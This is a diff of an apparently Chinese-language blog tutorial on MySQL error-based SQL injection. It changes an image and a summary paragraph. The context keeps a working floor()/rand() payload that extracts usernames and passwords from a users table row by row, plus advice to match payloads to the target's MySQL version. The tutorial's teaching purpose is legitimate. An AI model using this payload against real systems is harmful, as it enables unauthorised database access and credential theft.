@@ -354,9 +354,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or (select * from (select 1,count(*),(concat_ws(&apos;-&apos;,(select concat_ws(&apos;-&apos;,id,username,password) from users limit 0,1),floor(rand(0)*2)))x from information_schema.tables group by x)a )#</span><br></pre></td></tr></table></figure>
 
 <p>通过改变limit 0,1中的0便可以逐行查看users表的数据。</p>
+<img src="/2019/08/13/error-based-injection/1_16.png" title="pic16">
+
 <p><strong>floor( )报错注入总结：只要把group by后面的字段改成想查看的内容的查询语句便能爆出数据，上面的payload的x就是想要爆出的内容。</strong></p>
 <hr>
-<h4 id="总结：以上讲解了updatexml-、extractvalue-和floor-这个三种常用的报错注入方式，当然还有其他的报错注入，如NAME-CONST报错、join报错和polygon-报错等等。注意，不同的报错注入方式对MySQL的版本有不同的要求，大家请根据目标主机的使用的MySQL的版本使用合适的payload。"><a href="#总结：以上讲解了updatexml-、extractvalue-和floor-这个三种常用的报错注入方式，当然还有其他的报错注入，如NAME-CONST报错、join报错和polygon-报错等等。注意，不同的报错注入方式对MySQL的版本有不同的要求，大家请根据目标主机的使用的MySQL的版本使用合适的payload。" class="headerlink" title="总结：以上讲解了updatexml( )、extractvalue( )和floor( )这个三种常用的报错注入方式，当然还有其他的报错注入，如NAME_CONST报错、join报错和polygon ()报错等等。注意，不同的报错注入方式对MySQL的版本有不同的要求，大家请根据目标主机的使用的MySQL的版本使用合适的payload。"></a>总结：以上讲解了updatexml( )、extractvalue( )和floor( )这个三种常用的报错注入方式，当然还有其他的报错注入，如NAME_CONST报错、join报错和polygon ()报错等等。注意，不同的报错注入方式对MySQL的版本有不同的要求，大家请根据目标主机的使用的MySQL的版本使用合适的payload。</h4><hr>
+<p><strong>总结：以上讲解了updatexml( )、extractvalue( )和floor( )这个三种常用的报错注入方式，当然还有其他的报错注入，如NAME_CONST、join和polygon ( )等报错注入方式。注意，不同的报错注入方式对MySQL的版本有不同的要求，大家请根据目标主机的使用的MySQL的版本使用合适的payload。</strong></p>
 
 
                 
